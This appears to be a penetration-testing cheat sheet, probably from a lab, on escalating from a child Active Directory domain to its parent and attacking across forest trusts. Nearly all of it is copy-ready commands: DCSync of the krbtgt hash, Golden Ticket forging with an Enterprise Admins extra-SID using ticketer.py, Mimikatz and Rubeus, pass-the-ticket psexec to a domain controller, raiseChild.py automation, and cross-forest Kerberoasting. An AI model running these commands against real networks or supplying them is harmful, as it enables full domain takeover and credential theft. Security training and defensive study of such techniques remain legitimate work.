# 01.07 Cross-Domain Trust Attacks

> Forge a Golden Ticket with the Enterprise Admins extra-SID to hop from child to parent — automatable with `raiseChild.py`.

## Overview

Child-to-parent: DCSync child krbtgt, enumerate SIDs with lookupsid.py, forge Golden Ticket with extra-sid (Enterprise Admins SID). Use Mimikatz kerberos::golden or Rubeus golden/ptt from Windows, ticketer.py + psexec.py -k from Linux. raiseChild.py automates the full chain. Cross-forest: Kerberoast across trust with GetUserSPNs.py -target-domain or Rubeus /domain.

## Steps

- DCSync child krbtgt to get NTLM hash.
- lookupsid.py to get child domain SID and parent Enterprise Admins SID.
- Forge Golden Ticket with extra-sid pointing to Enterprise Admins.
- Pass-the-ticket to access parent DC file system and DCSync.
- From Windows: Mimikatz kerberos::golden /ptt or Rubeus golden /ptt.
- Automated: raiseChild.py -target-exec.
- Cross-forest Kerberoast: GetUserSPNs.py -target-domain or Rubeus /domain.

## Commands

### DCSync child krbtgt

```bash
secretsdump.py logistics.<DOMAIN>.local/[email protected] -just-dc-user LOGISTICS/krbtgt
```

### lookupsid child

```bash
lookupsid.py logistics.<DOMAIN>.local/[email protected] | grep "Domain SID"
```

### lookupsid parent EA SID

```bash
lookupsid.py logistics.<DOMAIN>.local/[email protected] | grep -B12 "Enterprise Admins"
```

### ticketer.py golden

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.<DOMAIN>.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

### psexec with golden

```bash
export KRB5CCNAME=hacker.ccache; psexec.py LOGISTICS.<DOMAIN>.LOCAL/[email protected] -k -no-pass -target-ip 172.16.5.5
```

### Mimikatz golden ptt

```text
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.<DOMAIN>.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### Rubeus golden ptt

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.<DOMAIN>.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

### raiseChild.py

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.<DOMAIN>.LOCAL/<USER>
```

### Cross-forest Kerberoast

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL <DOMAIN>.LOCAL/wley
```

### Rubeus cross-forest

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
